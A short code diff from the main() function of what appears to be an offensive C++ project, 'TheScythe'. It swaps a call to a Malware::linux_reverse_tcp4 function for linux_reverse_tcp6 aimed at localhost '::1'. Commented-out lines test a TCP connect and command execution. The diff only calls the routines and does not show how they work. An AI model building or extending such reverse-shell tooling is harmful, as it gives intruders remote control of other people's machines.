@@ -22,7 +22,7 @@ int main()
     TheScythe::Utils::Decoder::b64Decode(TheScythe::Utils::Encoder::b64Encode(data), decode);
     std::cout << decode;*/
     const char *ip = TheScythe::Utils::Decoder::bin_to_ip("1111111", "0", "0", "1").c_str();
-    TheScythe::Core::Malware::linux_reverse_tcp4(ip, port);
+    TheScythe::Core::Malware::linux_reverse_tcp6("::1", port);
     //std::cout << TheScythe::Core::Socket::tcp_connect_ipv4(ip, 9002, NULL);
     //const char * cmd = "ls";
     //std::cout << TheScythe::Core::Execution::exec(cmd) << std::endl;
